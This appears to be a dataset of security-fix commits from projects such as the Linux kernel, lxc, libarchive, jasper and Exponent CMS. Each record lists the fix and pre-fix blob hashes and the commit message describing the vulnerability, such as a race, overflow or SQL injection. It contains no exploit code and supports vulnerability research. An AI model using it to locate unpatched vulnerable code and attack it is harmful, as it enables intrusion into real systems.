dracut.sh: create the initramfs non-world readable also if early cpio is used\n\nFixes: 5f2c30d9bcd614d546d5c55c6897e33f88b9ab90 Previously fixed CVE-2012-4453: e1b48995c26c4f06d1a718539cb1bd5b0179af91\n\nSigned-off-by: Andreas Stieger <astieger@suse.com>

======================================================================
Commit With Fix: 
    4afa5f9617927453ac04b24b584f6c718dfb4f45
File(s) In Commit: 
    crypto/algif_hash.c
Blob(s) In Commit: 
    b4c24fe3dcfb5ed575350406c9dd7ece3c006aef
Blob(s) Before Fix: 
    01da360bdb5510b78eac0ee43630795c4a011d76
    01f56eb7816ee4320a9acd9632c3e4b5bc3233ee
    0262210cad386bde9b75f45d823c730920a54756
    1396ad0787fc6b84ebdd9a9d552ce7eaccf1e698
    68a5ceaa04c81072f453a7b2ca2605bed39bd5a1
    850246206b1258a697f83e86c39acc9b0a17f973
    ef5356cd280a54c086e4f8ff964245e38748a391
Projects:
    0-T-0_ps4-linux
Commit Message for 4afa5f9617927453ac04b24b584f6c718dfb4f45:
crypto: algif_hash - Only export and import on sockets with data\n\nThe hash_accept call fails to work on sockets that have not received any data.  For some algorithm implementations it may cause crashes.\n\nThis patch fixes this by ensuring that we only export and import on sockets that have received data.\n\nCc: stable@vger.kernel.org Reported-by: Harsh Jain <harshjain.prof@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Stephan Mueller <smueller@chronox.de>

======================================================================
Commit With Fix: 
    81f466d05f2a89cb4f122ef7f593ff3f279b165c
File(s) In Commit: 
    src/lxc/attach.c
Blob(s) In Commit: 
    2f095b408f110d18c4c2a40fdb49169936bdfeb3
Blob(s) Before Fix: 
    bfb2abf0143e0b011d58923f3efeadafed90d170
Projects:
    0x0916_lxc
Commit Message for 81f466d05f2a89cb4f122ef7f593ff3f279b165c:
attach: do not send procfd to attached process\n\nSo far, we opened a file descriptor refering to proc on the host inside the host namespace and handed that fd to the attached process in attach_child_main(). This was done to ensure that LSM labels were correctly setup. However, by exploiting a potential kernel bug, ptrace could be used to prevent the file descriptor from being closed which in turn could be used by an unprivileged container to gain access to the host namespace. Aside from this needing an upstream kernel fix, we should make sure that we don't pass the fd for proc itself to the attached process. However, we cannot completely prevent this, as the attached process needs to be able to change its apparmor profile by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the attack surface, we only send the fd for /proc/self/attr/exec or /proc/self/attr/current to the attached process. To do this we introduce a little more IPC between the child and parent:\n\n	 * IPC mechanism: (X is receiver) 	 *   initial process        intermediate          attached 	 *        X           <---  send pid of 	 *                          attached proc, 	 *                          then exit 	 *    send 0 ------------------------------------>    X 	 *                                              [do initialization] 	 *        X  <------------------------------------  send 1 	 *   [add to cgroup, ...] 	 *    send 2 ------------------------------------>    X 	 *						[set LXC_ATTACH_NO_NEW_PRIVS] 	 *        X  <------------------------------------  send 3 	 *   [open LSM label fd] 	 *    send 4 ------------------------------------>    X 	 *   						[set LSM label] 	 *   close socket                                 close socket 	 *                                                run program\n\nThe attached child tells the parent when it is ready to have its LSM labels set up. The parent then opens an approriate fd for the child PID to /proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM_RIGHTS to the child. The child can then set its LSM laben. Both sides then close the socket fds and the child execs the requested process.\n\nSigned-off-by: Christian Brauner <christian.brauner@canonical.com>

======================================================================
Commit With Fix: 
    f5527fffff3f002b0a6b376163613b82f69de073
File(s) In Commit: 
    lib/mpi/mpi-pow.c
Blob(s) In Commit: 
    e24388a863a76ff47afc2a7fc3680bc6ab6e8f4e
Blob(s) Before Fix: 
    2fd7a46d55ecc70813b9cf64314d17e890f0ff65
    468fb7cd1221ef77240dac361c4e967268b9318e
    49edd762e47f2bbf3821b39b9c58e29b2b6f12fc
    5464c8744ea95647beeef44efc3722161f5b224b
    67f3e79af9140e0160a4264b506b41344304e916
    82b19e4f118999f070f40dba0a356ed0c8070cdd
    a5c921e6d667a0c1619d77c10413db8850695307
    b04a3cf8008083d8e54f861df465b1f831b98df3
Projects:
    0-T-0_ps4-linux
Commit Message for f5527fffff3f002b0a6b376163613b82f69de073:
mpi: Fix NULL ptr dereference in mpi_powm() [ver #3]\n\nThis fixes CVE-2016-8650.\n\nIf mpi_powm() is given a zero exponent, it wants to immediately return either 1 or 0, depending on the modulus.  However, if the result was initalised with zero limb space, no limbs space is allocated and a NULL-pointer exception ensues.\n\nFix this by allocating a minimal amount of limb space for the result when the 0-exponent case when the result is 1 and not touching the limb space when the result is 0.\n\nThis affects the use of RSA keys and X.509 certificates that carry them.\n\nBUG: unable to handle kernel NULL pointer dereference at           (null) IP: [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 PGD 0 Oops: 0002 [#1] SMP Modules linked in: CPU: 3 PID: 3014 Comm: keyctl Not tainted 4.9.0-rc6-fscache+ #278 Hardware name: ASUS All Series/H97-PLUS, BIOS 2306 10/09/2014 task: ffff8804011944c0 task.stack: ffff880401294000 RIP: 0010:[<ffffffff8138ce5d>]  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6 RSP: 0018:ffff880401297ad8  EFLAGS: 00010212 RAX: 0000000000000000 RBX: ffff88040868bec0 RCX: ffff88040868bba0 RDX: ffff88040868b260 RSI: ffff88040868bec0 RDI: ffff88040868bee0 RBP: ffff880401297ba8 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000047 R11: ffffffff8183b210 R12: 0000000000000000 R13: ffff8804087c7600 R14: 000000000000001f R15: ffff880401297c50 FS:  00007f7a7918c700(0000) GS:ffff88041fb80000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 0000000000000000 CR3: 0000000401250000 CR4: 00000000001406e0 Stack:  ffff88040868bec0 0000000000000020 ffff880401297b00 ffffffff81376cd4  0000000000000100 ffff880401297b10 ffffffff81376d12 ffff880401297b30  ffffffff81376f37 0000000000000100 0000000000000000 ffff880401297ba8 Call Trace:  [<ffffffff81376cd4>] ? __sg_page_iter_next+0x43/0x66  [<ffffffff81376d12>] ? sg_miter_get_next_page+0x1b/0x5d  [<ffffffff81376f37>] ? sg_miter_next+0x17/0xbd  [<ffffffff8138ba3a>] ? mpi_read_raw_from_sgl+0xf2/0x146  [<ffffffff8132a95c>] rsa_verify+0x9d/0xee  [<ffffffff8132acca>] ? pkcs1pad_sg_set_buf+0x2e/0xbb  [<ffffffff8132af40>] pkcs1pad_verify+0xc0/0xe1  [<ffffffff8133cb5e>] public_key_verify_signature+0x1b0/0x228  [<ffffffff8133d974>] x509_check_for_self_signed+0xa1/0xc4  [<ffffffff8133cdde>] x509_cert_parse+0x167/0x1a1  [<ffffffff8133d609>] x509_key_preparse+0x21/0x1a1  [<ffffffff8133c3d7>] asymmetric_key_preparse+0x34/0x61  [<ffffffff812fc9f3>] key_create_or_update+0x145/0x399  [<ffffffff812fe227>] SyS_add_key+0x154/0x19e  [<ffffffff81001c2b>] do_syscall_64+0x80/0x191  [<ffffffff816825e4>] entry_SYSCALL64_slow_path+0x25/0x25 Code: 56 41 55 41 54 53 48 81 ec a8 00 00 00 44 8b 71 04 8b 42 04 4c 8b 67 18 45 85 f6 89 45 80 0f 84 b4 06 00 00 85 c0 75 2f 41 ff ce <49> c7 04 24 01 00 00 00 b0 01 75 0b 48 8b 41 18 48 83 38 01 0f RIP  [<ffffffff8138ce5d>] mpi_powm+0x32/0x7e6  RSP <ffff880401297ad8> CR2: 0000000000000000 ---[ end trace d82015255d4a5d8d ]---\n\nBasically, this is a backport of a libgcrypt patch:\n\n	http://git.gnupg.org/cgi-bin/gitweb.cgi?p=libgcrypt.git a=patch h=6e1adb05d290aeeb1c230c763970695f4a538526\n\nFixes: cdec9cb5167a ("crypto: GnuPG based MPI lib - source files (part 1)") Signed-off-by: Andrey Ryabinin <aryabinin@virtuozzo.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: Dmitry Kasatkin <dmitry.kasatkin@gmail.com> cc: linux-ima-devel@lists.sourceforge.net cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    84ac7260236a49c79eede91617700174c2c19b0c
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    dd2332390c45bbff7c3fc5d259453f2e1ca352bf
Blob(s) Before Fix: 
    11db0d619c007270e7ac003e916a4a4097a79dc9
    18d0becbc46d0dd069dde0bcce47c8b4ee2186f9
    2e8286b47c28e5bef7cb80162e12ddb8ca4b358e
    33a4697d55394c0a73b5f88e3b19ecd0d923a878
    4040eb92d9c9dc3b1ce0ba41227b6b1e9bd32eff
    48b181797d7b5dc652bc374ad310569456eaaeea
    64acea0adaaea6c31aa55a734dcc5263890644ba
    70dfb49c7627fb9868f7d36138c343107ceeab16
    992396aa635ce1174f6e62f19ae3f19a550668c6
    ae7bfd26cd91c7a73797181250aa8c6ba883a231
    af399cac5205402480300ae7b7d6fbb2094095fb
    b43c4015b2f79678bb5a2edffdd4e57cf9bdb880
    b85c67ccb797197abf51596ac5f3044131aa97d8
    c5c9e2a54218207f0dba9b16920b2e17da84c353
    d2238b204691b8e4f2e3acb9bc167b553ba32d50
    db28948b150f8b9d938af5a56bf2a1c50e2cff56
    f12c17f355d932d9b6a396654a66fceb5aaf0c73
    f223d1c80ccf7f9251dce0f8f31f58c766576946
    f6a703b25b6c2bc1aaa33276f4a1b18a7f9f60b3
    f8db7064d81c770cda356633153230eb905ccb39
Projects:
    0-T-0_ps4-linux
Commit Message for 84ac7260236a49c79eede91617700174c2c19b0c:
packet: fix race condition in packet_set_ring\n\nWhen packet_set_ring creates a ring buffer it will initialize a struct timer_list if the packet version is TPACKET_V3. This value can then be raced by a different thread calling setsockopt to set the version to TPACKET_V1 before packet_set_ring has finished.\n\nThis leads to a use-after-free on a function pointer in the struct timer_list when the socket is closed as the previously initialized timer will not be deleted.\n\nThe bug is fixed by taking lock_sock(sk) in packet_setsockopt when changing the packet version while also taking the lock at the start of packet_set_ring.\n\nFixes: f6fb8f100b80 ("af-packet: TPACKET_V3 flexible buffer implementation.") Signed-off-by: Philip Pettersson <philip.pettersson@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ded89912156b1a47d940a0c954c43afbabd0c42c
File(s) In Commit: 
    drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c
Blob(s) In Commit: 
    b8aec5e5ef93e28dfb70c95557d7388fd9b67bef
Blob(s) Before Fix: 
    121baba7acb194c4bba69fb78526f80e19223b65
    2628d5e12c6424b657b7dd9138c277ef0a9d5d47
    5db56a74e7df0da940a074e8c7ee21b60c2d931b
    62f475e31077ca1fa1df15863f02ee0911c46997
    7b01e4ddb315b70ca0432371ecdb695808c2a4ac
    d0631b6cfd5302ee7d73c25937f29f8184e0be83
    d5c2a27573b45cdfcbb72bf32dedc1dcd0af82da
Projects:
    0-T-0_ps4-linux
Commit Message for ded89912156b1a47d940a0c954c43afbabd0c42c:
brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()\n\nUser-space can choose to omit NL80211_ATTR_SSID and only provide raw IE TLV data. When doing so it can provide SSID IE with length exceeding the allowed size. The driver further processes this IE copying it into a local variable without checking the length. Hence stack can be corrupted and used as exploit.\n\nCc: stable@vger.kernel.org # v4.7 Reported-by: Daxing Guo <freener.gdx@gmail.com> Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com> Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com> Reviewed-by: Franky Lin <franky.lin@broadcom.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

======================================================================
Commit With Fix: 
    53110871935244816bbb9d131da0bccff734bfe9
File(s) In Commit: 
    src/gd_io_dp.c
Blob(s) In Commit: 
    228bfa5cf25555f7fd0b720d5265e2b443dfe297
Blob(s) Before Fix: 
    135eda3fcb09ada7bdbd0eb47d36f5c03c17d795
Projects:
    86salo_libgd
Commit Message for 53110871935244816bbb9d131da0bccff734bfe9:
Avoid potentially dangerous signed to unsigned conversion\n\nWe make sure to never pass a negative `rlen` as size to memcpy(). See also <https://bugs.php.net/bug.php?id=73280>.\n\nPatch provided by Emmanuel Law.

======================================================================
Commit With Fix: 
    e5b019725f53b79159931d3a7317107cbbfd0860
File(s) In Commit: 
    libavformat/m4vdec.c
Blob(s) In Commit: 
    9d69dcc042142a93b0a61a2a41854e84a4c26b42
Blob(s) Before Fix: 
    04bd0621bc48e2a67bf12fa3a7b34097ec16a99c
    4a0af3c03735e91c0883d797cc34f3f45060b965
    4bee058a50358f7a9fd2f51e9cb11e4e6e1162b6
    e856aadc10061494fc114cebe99e9ffc2e2e69a2
Projects:
    00ERNEST00_FFmpeg
Commit Message for e5b019725f53b79159931d3a7317107cbbfd0860:
m4vdec: Check for non-startcode 00 00 00 sequences in probe\n\nThis makes the m4v detection less trigger-happy.\n\nBug-Id: 949 Signed-off-by: Diego Biurrun <diego@biurrun.de>

======================================================================
Commit With Fix: 
    6e48aa92ff4e6e95424300ecd52a9ea453c19c60
File(s) In Commit: 
    coders/tiff.c
Blob(s) In Commit: 
    daab01eba1b4094c72a3b9585ad333c63b3e9d48
Blob(s) Before Fix: 
    74584c5f2820cd082b5cd4738da00410771c7106
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 6e48aa92ff4e6e95424300ecd52a9ea453c19c60:
https://github.com/ImageMagick/ImageMagick/issues/268

======================================================================
Commit With Fix: 
    7f17c791dcfd8c0416e2cd2485b19410e47ef126
File(s) In Commit: 
    libarchive/archive_read_support_format_7zip.c
Blob(s) In Commit: 
    c0a536c4a981cae29c19d508acc281c3d02b8835
Blob(s) Before Fix: 
    1dfe52b8539a0fd0cc9132db3ce56b51e412d42c
    90901acb710fff13d8737c13df21272bb430525b
Projects:
    AasemShokr_libarchive
Commit Message for 7f17c791dcfd8c0416e2cd2485b19410e47ef126:
Issue 761:  Heap overflow reading corrupted 7Zip files\n\nThe sample file that demonstrated this had multiple 'EmptyStream' attributes.  The first one ended up being used to calculate certain statistics, then was overwritten by the second which was incompatible with those statistics.\n\nThe fix here is to reject any header with multiple EmptyStream attributes.  While here, also reject headers with multiple EmptyFile, AntiFile, Name, or Attributes markers.

======================================================================
Commit With Fix: 
    d8c2604cd438c41ec72aff52c16ebd8183068020
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Blob(s) Before Fix: 
    6da48720dd6b0d57942489ee5e783bbf581d0637
Projects:
    did-g_jasper
Commit Message for d8c2604cd438c41ec72aff52c16ebd8183068020:
Added range check on XRsiz and YRsiz fields of SIZ marker segment.

======================================================================
Commit With Fix: 
    d8c2604cd438c41ec72aff52c16ebd8183068020
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    55d34d674fdf3d27be4e4d167dc86efc6142dcf9
Blob(s) Before Fix: 
    6da48720dd6b0d57942489ee5e783bbf581d0637
Projects:
    did-g_jasper
Commit Message for d8c2604cd438c41ec72aff52c16ebd8183068020:
Added range check on XRsiz and YRsiz fields of SIZ marker segment.

======================================================================
Commit With Fix: 
    44a524e367597af58d6265ae2014468b334d0309
File(s) In Commit: 
    src/libjasper/base/jas_stream.c
Blob(s) In Commit: 
    29e4291cb689b003502e1df40ba4c4b47af9df84
Blob(s) Before Fix: 
    f1829728cf2238e68e1c8b48db9b377a5a93642d
Projects:
    did-g_jasper
Commit Message for 44a524e367597af58d6265ae2014468b334d0309:
The memory stream interface allows for a buffer size of zero. The case of a zero-sized buffer was not handled correctly, as it could lead to a double free. This problem has now been fixed (hopefully). One might ask whether a zero-sized buffer should be allowed at all, but this is a question for another day.

======================================================================
Commit With Fix: 
    9590232bb4f4cc824f3425a6e1349afbe6d6d2b7
File(s) In Commit: 
    drivers/staging/android/ion/ion.c
Blob(s) In Commit: 
    33b390e7ea31174558dd95e5da961a61464999e3
Blob(s) Before Fix: 
    7ff2a7ec871f9810bb58453e8ac5e87391734405
Projects:
    0-T-0_ps4-linux
Commit Message for 9590232bb4f4cc824f3425a6e1349afbe6d6d2b7:
staging/android/ion : fix a race condition in the ion driver\n\nThere is a use-after-free problem in the ion driver. This is caused by a race condition in the ion_ioctl() function.\n\nA handle has ref count of 1 and two tasks on different cpus calls ION_IOC_FREE simultaneously.\n\ncpu 0                                   cpu 1 ------------------------------------------------------- ion_handle_get_by_id() (ref == 2)                             ion_handle_get_by_id()                             (ref == 3)\n\nion_free() (ref == 2)\n\nion_handle_put() (ref == 1)\n\n                            ion_free()                             (ref == 0 so ion_handle_destroy() is                             called                             and the handle is freed.)\n\n                            ion_handle_put() is called and it                             decreases the slub's next free pointer\n\nThe problem is detected as an unaligned access in the spin lock functions since it uses load exclusive  instruction. In some cases it corrupts the slub's free pointer which causes a mis-aligned access to the next free pointer.(kmalloc returns a pointer like ffffc0745b4580aa). And it causes lots of other hard-to-debug problems.\n\nThis symptom is caused since the first member in the ion_handle structure is the reference count and the ion driver decrements the reference after it has been freed.\n\nTo fix this problem client->lock mutex is extended to protect all the codes that uses the handle.\n\nSigned-off-by: Eun Taik Lee <eun.taik.lee@samsung.com> Reviewed-by: Laura Abbott <labbott@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    1c109fabbd51863475cd12ac206bdd249aee35af
File(s) In Commit: 
    arch/x86/include/asm/uaccess.h
Blob(s) In Commit: 
    2131c4ce7d8a10698c45626e2781dd8f1cb2f9b9
Blob(s) Before Fix: 
    0328c2ccc55d97010ad8bf0461903aa68f72e2b3
    09b1b0ab94b7653f7ed7019eb7e35b518582f825
    0d592e0a5b84fa3c3738ce8400e34df5bb552eb0
    2982387ba8171e1cd5a7ba2c4b9a800059a50791
    2e7513d1f1f45eb3bb7ec4ebe459aec2fa76b46d
    a0ae610b9280183fc1ca42ddd3fcc45333b433c5
    a4a30e4b2d34321d96ddd02413d037d3f6cb95d9
    a8df874f3e8825b0ea6bde91909b8b3d7b380ba7
    a969ae607be8323578865285b27cb443451b4483
    ace9dec050b17b1a766899a946ab83d6bbe31641
    c03bfb68c50352df52d6ae4e36fa54bdc22dbc50
    c0f27d7ea7ff95eaea44987bd94417fabe68ca98
    c3f2911952948244c859b3822c5a804e85d73cf8
    e3af86f58eafdbeb1dc92008d74033e9aedeba13
    faf3687f1035c466c87684110fbc221afcce141f
Projects:
    0-T-0_ps4-linux
Commit Message for 1c109fabbd51863475cd12ac206bdd249aee35af:
fix minor infoleak in get_user_ex()\n\nget_user_ex(x, ptr) should zero x on failure.  It's not a lot of a leak (at most we are leaking uninitialized 64bit value off the kernel stack, and in a fairly constrained situation, at that), but the fix is trivial, so...\n\nCc: stable@vger.kernel.org Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> [ This sat in different branch from the uaccess fixes since mid-August ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    0ce8b94d745b818bd207933d9a2e7f32587c2c89
File(s) In Commit: 
    framework/modules/core/controllers/expHTMLEditorController.php
Blob(s) In Commit: 
    10623b6e7e1ad429a3285a5c07a4b872c0e4dd39
Blob(s) Before Fix: 
    0b347b925bb6f3863350b6e564d39417b4474425
    392e3027c2f97ebfd9391c8ffaaac229e2cbeb3c
Projects:
    nwtn_exponent-cms
Commit Message for 0ce8b94d745b818bd207933d9a2e7f32587c2c89:
better fix security vulnerability in editor preview  reported by fyth

======================================================================
Commit With Fix: 
    93362fa47fe98b62e4a34ab408c4a418432e7939
File(s) In Commit: 
    fs/proc/proc_sysctl.c
Blob(s) In Commit: 
    d4e37acd48217dcb1090a1ee68bb4ec4cb7226e5
Blob(s) Before Fix: 
    000cea46434a82a2602ed6f9bb551bd8a5f06c4e
    1b93650dda2fc5f51cb9c0d42c94efcc2f561a92
    4dbe1e2daeca6eb4778cd5b3f8d50da2dff653bc
    55313d9948954bbe4bff5769e487eb78012776db
    55ef074a47863bdf6b819c880f64b135b3394082
    5e57c3e46e1da6d2338cdce05ec0044d5b158797
    71025b9e2a4e6332959e1ceca263be7d87923efb
    71290463a1d3fa87a5132e21615792fe7fbaf9f4
    847f23420b407ea4e7939efd5caf324d987ef5c3
    a6b62173d4c310e4fa4b131a214043667fa67726
    acf2904ecd7e6a7e214424a093a37a1232d51ca2
    c74570736b24c3798a9e2f55fd3f953ac28aa130
    f92d5dd578a4a5289aab9e29dcd37b09ee775c46
    fdda62e6115e1c4584cc88d360c27de7a26e1793
    fe5b6e6c46719a79de1d808de782ccfd20bf67a8
Projects:
    0-T-0_ps4-linux
Commit Message for 93362fa47fe98b62e4a34ab408c4a418432e7939:
sysctl: Drop reference added by grab_header in proc_sys_readdir\n\nFixes CVE-2016-9191, proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. It can cause any path called unregister_sysctl_table will wait forever.\n\nThe calltrace of CVE-2016-9191:\n\n[ 5535.960522] Call Trace: [ 5535.963265]  [<ffffffff817cdaaf>] schedule+0x3f/0xa0 [ 5535.968817]  [<ffffffff817d33fb>] schedule_timeout+0x3db/0x6f0 [ 5535.975346]  [<ffffffff817cf055>] ? wait_for_completion+0x45/0x130 [ 5535.982256]  [<ffffffff817cf0d3>] wait_for_completion+0xc3/0x130 [ 5535.988972]  [<ffffffff810d1fd0>] ? wake_up_q+0x80/0x80 [ 5535.994804]  [<ffffffff8130de64>] drop_sysctl_table+0xc4/0xe0 [ 5536.001227]  [<ffffffff8130de17>] drop_sysctl_table+0x77/0xe0 [ 5536.007648]  [<ffffffff8130decd>] unregister_sysctl_table+0x4d/0xa0 [ 5536.014654]  [<ffffffff8130deff>] unregister_sysctl_table+0x7f/0xa0 [ 5536.021657]  [<ffffffff810f57f5>] unregister_sched_domain_sysctl+0x15/0x40 [ 5536.029344]  [<ffffffff810d7704>] partition_sched_domains+0x44/0x450 [ 5536.036447]  [<ffffffff817d0761>] ? __mutex_unlock_slowpath+0x111/0x1f0 [ 5536.043844]  [<ffffffff81167684>] rebuild_sched_domains_locked+0x64/0xb0 [ 5536.051336]  [<ffffffff8116789d>] update_flag+0x11d/0x210 [ 5536.057373]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.064186]  [<ffffffff81167acb>] ? cpuset_css_offline+0x1b/0x60 [ 5536.070899]  [<ffffffff810fce3d>] ? trace_hardirqs_on+0xd/0x10 [ 5536.077420]  [<ffffffff817cf61f>] ? mutex_lock_nested+0x2df/0x450 [ 5536.084234]  [<ffffffff8115a9f5>] ? css_killed_work_fn+0x25/0x220 [ 5536.091049]  [<ffffffff81167ae5>] cpuset_css_offline+0x35/0x60 [ 5536.097571]  [<ffffffff8115aa2c>] css_killed_work_fn+0x5c/0x220 [ 5536.104207]  [<ffffffff810bc83f>] process_one_work+0x1df/0x710 [ 5536.110736]  [<ffffffff810bc7c0>] ? process_one_work+0x160/0x710 [ 5536.117461]  [<ffffffff810bce9b>] worker_thread+0x12b/0x4a0 [ 5536.123697]  [<ffffffff810bcd70>] ? process_one_work+0x710/0x710 [ 5536.130426]  [<ffffffff810c3f7e>] kthread+0xfe/0x120 [ 5536.135991]  [<ffffffff817d4baf>] ret_from_fork+0x1f/0x40 [ 5536.142041]  [<ffffffff810c3e80>] ? kthread_create_on_node+0x230/0x230\n\nOne cgroup maintainer mentioned that "cgroup is trying to offline a cpuset css, which takes place under cgroup_mutex.  The offlining ends up trying to drain active usages of a sysctl table which apprently is not happening." The real reason is that proc_sys_readdir doesn't drop reference added by grab_header when return from !dir_emit_dots path. So this cpuset offline path will wait here forever.\n\nSee here for details: http://www.openwall.com/lists/oss-security/2016/11/04/13\n\nFixes: f0c3b5093add ("[readdir] convert procfs") Cc: stable@vger.kernel.org Reported-by: CAI Qian <caiqian@redhat.com> Tested-by: Yang Shukui <yangshukui@huawei.com> Signed-off-by: Zhou Chengming <zhouchengming1@huawei.com> Acked-by: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    6172f67620ac13fc2f4e9d650c61937d48e9ecb9
File(s) In Commit: 
    framework/modules/core/controllers/expRatingController.php
Blob(s) In Commit: 
    7090008407de9b5980476f9df069f180cc225d90
Blob(s) Before Fix: 
    be4bb222b90eb91013e1942c1866504c47b2a1aa
Projects:
    nwtn_exponent-cms
Commit Message for 6172f67620ac13fc2f4e9d650c61937d48e9ecb9:
fix security vulnerability in ratings  reported by fyth

======================================================================
Commit With Fix: 
    fffb2038de4c603931b785a4c3ec69cfd06181ba
File(s) In Commit: 
    framework/core/controllers/expController.php
Blob(s) In Commit: 
    17516b7563a64cf94d8d958808c1392e97697740
Blob(s) Before Fix: 
    a989f3ff4558b2c9e115dc5d6c04a57a1e1b53aa
Projects:
    nwtn_exponent-cms
Commit Message for fffb2038de4c603931b785a4c3ec69cfd06181ba:
fix sql injection security vulnerability  reported by Nicky [#1394 state:resolved] [#1395 state:resolved]

======================================================================
Commit With Fix: 
    e83721a5b9fcc88e1141a8fb29c3d1bd522257c1
File(s) In Commit: 
    framework/modules/search/controllers/searchController.php
Blob(s) In Commit: 
    fc1f9630b37a3a5359cbc7a9ca0f07cd9c3b59ea
Blob(s) Before Fix: 
    47bceb426e9619c83e861bf17ecb02aff20532a1
Projects:
    nwtn_exponent-cms
Commit Message for e83721a5b9fcc88e1141a8fb29c3d1bd522257c1:
fix security vulnerability in search method, reported by pang0lin

======================================================================
Commit With Fix: 
    559792be727f4e731bfcb3935f5beec7749e9ce9
File(s) In Commit: 
    framework/core/subsystems/expRouter.php
Blob(s) In Commit: 
    5600779a5d4766a61848ac48bfd7e1dec5ebe928
Blob(s) Before Fix: 
    88d794bf670d4f28d6cb35c46e9cd553a70bb9d9
Projects:
    nwtn_exponent-cms
Commit Message for 559792be727f4e731bfcb3935f5beec7749e9ce9:
fix sql injection security vulnerability which failed to account for sef urls adequately  reported by many, many users

======================================================================
Commit With Fix: 
    e7b6856ac384bf2b8ea7761a1e46d6e4186d36f4
File(s) In Commit: 
    framework/modules/users/controllers/usersController.php
Blob(s) In Commit: 
    3b4568633edaf7945df873a7b61a28f53da0b155
Blob(s) Before Fix: 
    7012b8496c4bd06d85ce86ea23e513dc13a9b4c0
Projects:
    nwtn_exponent-cms
Commit Message for e7b6856ac384bf2b8ea7761a1e46d6e4186d36f4:
fix security vulnerability to get user list, reported by pang0lin

======================================================================
Commit With Fix: 
    9eeed1e82fb9e6d0d41e7dd10672df48045a9b59
File(s) In Commit: 
    framework/modules/addressbook/controllers/addressController.php
Blob(s) In Commit: 
    a874da8735d5081e40e1552e26dbc64f7cf9e3ae
Blob(s) Before Fix: 
    e9825833ceb88c67a597753c64c73d91e2da33ac
Projects:
    nwtn_exponent-cms
Commit Message for 9eeed1e82fb9e6d0d41e7dd10672df48045a9b59:
fix security vulnerability to editing addresses, countries, and regions  reported by pang0lin

======================================================================
Commit With Fix: 
    e38aae66c785f08f3907aa121378caf71ca5f2d7
File(s) In Commit: 
    framework/modules/users/controllers/usersController.php
Blob(s) In Commit: 
    352c982c4e3094053f94b2b48602766d4896404c
Blob(s) Before Fix: 
    73820bb6b3b09f58d2afb5654e2eb54fd3f73c66
Projects:
    nwtn_exponent-cms
Commit Message for e38aae66c785f08f3907aa121378caf71ca5f2d7:
Prevent logged in uses from view other user records and admins from super-admin records  thanks to pang0lin

======================================================================
Commit With Fix: 
    4327ea96b3de89440693e06d03038121aa1fdcea
File(s) In Commit: 
    framework/modules/notfound/controllers/notfoundController.php
Blob(s) In Commit: 
    fc8bab066b7c0434e67cb1547731b19298a5304c
Blob(s) Before Fix: 
    87d9486379b05583dd7b452ac9be65ff5321f51e
Projects:
    nwtn_exponent-cms
Commit Message for 4327ea96b3de89440693e06d03038121aa1fdcea:
fix sql injection issue in notfound controller  reported by pang0lin

======================================================================
Commit With Fix: 
    2ddffb2e7eafe4830e3483a4b437873022c461ba
File(s) In Commit: 
    framework/modules/navigation/controllers/navigationController.php
Blob(s) In Commit: 
    ebe59313bfc605a9aff07272f9464495ae0dc220
Blob(s) Before Fix: 
    4db87e64de8c011aa185d60ee83bde1cee5a3977
    90180d6276e269c7f0de84a99c0cca5f6c93971a
Projects:
    nwtn_exponent-cms
Commit Message for 2ddffb2e7eafe4830e3483a4b437873022c461ba:
fix security vulnerability to reranking pages  reported by kyohpc

======================================================================
Commit With Fix: 
    7df3e59c3d1df4f87fe874c7956ef7a3d2f4d5fb
File(s) In Commit: 
    security/keys/big_key.c
Blob(s) In Commit: 
    835c1ab30d01eb9a8e94b411fce09b856772efb9
Blob(s) Before Fix: 
    001abe530a0d456b08ac1664dc10e966b6f82ee4
    2806e70d7f8fcddfd1b39a1fed8114975ff1c82c
    47c6dcab1a8e23baed40bd4b667e35d3606f8b7f
    8137b27d641dad9080df66c829f8109472dbccc6
    8d823cc6c8ed637d307b81cadbc63b3ec061ffed
    907c1522ee469b05d42bcf9a839c0a80bf7eff6c
    90c0740b70e81b6240607cdf39c37c8e82634bc8
    929e14978c421b227e592e937d9157ca2235b2f7
    9e443fccad4cfde54deb9710feb4eee4bdadae17
    ad39a0bdf846caaeb4d3ecea3ac9ffcecbb7d37a
    b6adb94f6d52573aecf2e38a16724e06895dded6
    c0b3030b563486af0f1756d6d73ae32fe02a77c8
    c2f91a0cf8899cb0d8d69fd06ebcc05405cf45f7
    c721e398893add4712d891a9dabeeee117048782
    e6288173d99de32aed964ee9ed61c6f47fd4b1a1
    f952a9d98d405f0f081640b258100c16cc59c9fe
Projects:
    0-T-0_ps4-linux
